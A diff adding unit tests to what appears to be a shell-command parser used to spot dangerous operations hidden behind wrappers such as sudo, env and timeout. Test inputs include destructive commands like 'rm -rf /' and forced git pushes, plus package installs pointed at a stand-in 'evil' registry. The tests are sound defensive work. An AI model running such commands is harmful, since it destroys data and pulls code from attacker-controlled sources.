@@ -95,6 +95,86 @@ test("leaf hidden in cd x && git push -f is found", () => {
   assert.ok(push && push.hasFlag("force"));
 });
 
+// --- command-wrapper prefixes are resolved to the real operation ------------
+
+test("env VAR= git push --force → git push --force leaf", () => {
+  const l = one("env GIT_SSH= git push --force origin main");
+  assert.equal(l.head, "git");
+  assert.ok(l.args.includes("push"));
+  assert.ok(l.hasFlag("force"));
+});
+
+test("command rm -rf / → rm leaf with force flag", () => {
+  const l = one("command rm -rf /");
+  assert.equal(l.head, "rm");
+  assert.ok(l.hasFlag("force"));
+  assert.ok(l.args.includes("/"));
+});
+
+test("sudo rm -rf / → rm leaf", () => {
+  const l = one("sudo rm -rf /");
+  assert.equal(l.head, "rm");
+  assert.ok(l.hasFlag("force"));
+});
+
+test("timeout 5 rm -rf / → duration skipped, rm leaf", () => {
+  const l = one("timeout 5 rm -rf /");
+  assert.equal(l.head, "rm");
+  assert.ok(l.args.includes("/"));
+  assert.ok(!l.args.includes("5")); // DURATION positional consumed by timeout
+});
+
+test("nice -n 10 rm -rf / → option value skipped, rm leaf", () => {
+  const l = one("nice -n 10 rm -rf /");
+  assert.equal(l.head, "rm");
+  assert.ok(!l.args.includes("10"));
+});
+
+test("nested wrappers sudo timeout 5 rm unwrap fully", () => {
+  const l = one("sudo timeout 5 rm -rf /");
+  assert.equal(l.head, "rm");
+});
+
+test("command with absolute-path inner head is basename-normalized", () => {
+  assert.equal(one("command /bin/rm -rf /").head, "rm");
+});
+
+test("bare env (no inner command) is preserved as an env leaf", () => {
+  const l = one("env");
+  assert.equal(l.head, "env");
+});
+
+test("env -i with no inner command stays env", () => {
+  assert.equal(one("env -i").head, "env");
+});
+
+// --- leading env-assignments are exposed on the leaf ------------------------
+
+test("PIP_INDEX_URL=… pip install → assignment exposed, head is pip", () => {
+  const l = one("PIP_INDEX_URL=http://evil/simple pip install pkg");
+  assert.equal(l.head, "pip");
+  assert.ok(l.hasAssign("PIP_INDEX_URL"));
+  assert.equal(l.assigns.get("PIP_INDEX_URL"), "http://evil/simple");
+});
+
+test("NPM_CONFIG_REGISTRY=… npm install → assignment exposed", () => {
+  const l = one("NPM_CONFIG_REGISTRY=http://evil npm install pkg");
+  assert.equal(l.head, "npm");
+  assert.ok(l.hasAssign("NPM_CONFIG_REGISTRY"));
+});
+
+test("env wrapper NAME=value is folded into the leaf's assigns", () => {
+  const l = one("env PIP_INDEX_URL=http://evil pip install pkg");
+  assert.equal(l.head, "pip");
+  assert.ok(l.hasAssign("PIP_INDEX_URL"));
+});
+
+test("a leaf with no assignments has an empty assigns map", () => {
+  const l = one("rm -rf /");
+  assert.equal(l.assigns.size, 0);
+  assert.ok(!l.hasAssign("PIP_INDEX_URL"));
+});
+
 // --- dynamic head / parse failure are handled ------------------------------
 
 test("dynamic head ($VAR) is skipped, not crashed", () => {
